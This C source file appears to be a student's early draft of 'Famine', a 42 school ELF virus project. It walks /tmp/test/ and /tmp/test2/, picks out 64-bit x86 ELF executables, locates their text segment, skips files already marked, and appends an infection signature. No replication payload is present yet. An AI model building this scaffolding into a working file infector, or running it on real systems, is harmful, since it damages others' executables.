/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: fcadet <fcadet@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2022/07/22 12:32:02 by fcadet            #+#    #+#             */
/*   Updated: 2022/07/23 16:30:38 by fcadet           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <sys/syscall.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/mman.h>
#include <elf.h>

#include <stdio.h>

#define BUFF_SZ		1024
#define IDENT		"\x7f" "ELF" "\x2"
#define SIGN		"Famine (42 project) - 2022 - by apitoise & fcadet"
#define SIGN_SZ		49

typedef struct		s_hdrs {
	Elf64_Ehdr		*elf;
	Elf64_Phdr		*txt;
	Elf64_Phdr		*nxt;
}					t_hdrs;

int		ret_close(int fd, int ret) {
	if (fd >= 0)
		close(fd);
	return (ret);
}

void	get_full_path(char *s1, char *s2, uint8_t *buff) {
	for (; *s1; ++s1, ++buff)
		*buff = *s1;
	for (; *s2; ++s2, ++buff)
		*buff = *s2;
	*buff = '\0';
}

int		str_n_cmp(char *s1, char *s2, int n) {
	for (; *s1 && *s1 == *s2; ++s1, ++s2)
		if (!--n)
			break;
	return (*s1 - *s2);
}

int64_t			get_fd_size(int fd) {
	int64_t		size;

	if ((size = lseek(fd, 0, SEEK_END)) < 0 || lseek(fd, 0, SEEK_SET) != 0)
		return (-1);
	return (size);
}

static int		map_file(uint8_t *path, uint8_t **mem, uint64_t *m_sz) {
	int			src;
	int64_t		s_ret;

	if ((src = open((char *)path, O_RDWR)) < 0)
		return (-1);
	if ((s_ret = get_fd_size(src)) < 0
			|| (*m_sz = (uint64_t)s_ret) < sizeof(Elf64_Ehdr)
			|| (*mem = mmap(NULL, *m_sz,
					PROT_READ | PROT_WRITE, MAP_PRIVATE, src, 0)) == MAP_FAILED)
		return (ret_close(src, -1));
	return (ret_close(src, 0));
}

static int		write_mem(uint8_t *path, uint8_t *mem, uint64_t m_sz) {
	int			dst;
	int64_t		w_ret;

	if ((dst = open((char *)path, O_WRONLY)) < 0)
		return (-1);
	if ((w_ret = write(dst, mem, m_sz)) < 0 || (uint64_t)w_ret != m_sz
			|| write(dst, SIGN, SIGN_SZ) != SIGN_SZ)
		return (ret_close(dst, -1));
	return (ret_close(dst, 0));
}

static int		test_elf_hdr(Elf64_Ehdr *e_hdr) {
	if (str_n_cmp((char *)e_hdr->e_ident, (IDENT), 5)
			|| (e_hdr->e_type != ET_EXEC && e_hdr->e_type != ET_DYN)
			|| e_hdr->e_machine != EM_X86_64
			|| (e_hdr->e_shstrndx == SHN_UNDEF || e_hdr->e_shstrndx == SHN_XINDEX))
		return (-1);
	return (0);
}

static int		check_infection(uint8_t *mem, uint64_t m_sz) {
	if (m_sz < SIGN_SZ)
		return (-1);
	if (!str_n_cmp((char *)(mem + m_sz - SIGN_SZ), SIGN, SIGN_SZ))
		return (-1);
	return (0);
}

static int		find_txt_seg(uint8_t *mem, t_hdrs *hdrs) {
	Elf64_Phdr	*p_hdr;
	uint64_t	i;

	for (i = 0, p_hdr = (Elf64_Phdr *)(mem + hdrs->elf->e_phoff);
			!hdrs->txt && i < hdrs->elf->e_phnum; ++i, ++p_hdr)
		if (p_hdr->p_type == PT_LOAD && (p_hdr->p_flags & PF_X))
			hdrs->txt = p_hdr;
	if (!hdrs->txt || i == hdrs->elf->e_phnum)
		return (-1);
	hdrs->nxt = p_hdr;
	return (0);
}

static void		proc_entries(uint8_t *ent_buff, uint64_t dir_ret, char *root_path) {
	uint8_t			*mem;
	uint64_t		m_sz;
	uint16_t		ent_sz;
	uint8_t			path_buff[BUFF_SZ];
	uint8_t			*ent_ptr;
	t_hdrs			hdrs;

	for (ent_ptr = ent_buff; dir_ret; dir_ret -= ent_sz, ent_ptr += ent_sz) {
		ent_sz = *(uint16_t *)(ent_ptr + 16);

		get_full_path(root_path, (char *)(ent_ptr + 18), path_buff);
		if (map_file(path_buff, &mem, &m_sz) < 0
				|| check_infection(mem, m_sz))
			continue;
		hdrs.elf = (Elf64_Ehdr *)mem;
		if (test_elf_hdr(hdrs.elf)
				|| find_txt_seg(mem, &hdrs))
			goto unmap_continue;

		printf("%s\n", path_buff);
		write_mem(path_buff, mem, m_sz);

		unmap_continue: munmap(mem, m_sz);
	}
}

int		main(void) {
	int				dir_fd;
	uint64_t		i;
	int64_t			dir_ret;
	char			*dirs[] = { "/tmp/test/", "/tmp/test2/" };
	uint8_t			ent_buff[BUFF_SZ];

	for (i = 0; i < 2; ++i) {
		if ((dir_fd = open(dirs[i], O_RDONLY | O_DIRECTORY)) < 0)
			continue;
		while ((dir_ret = syscall(SYS_getdents, dir_fd, ent_buff, BUFF_SZ)) > 0)
			proc_entries(ent_buff, dir_ret, dirs[i]);
		close(dir_fd);
	}
}
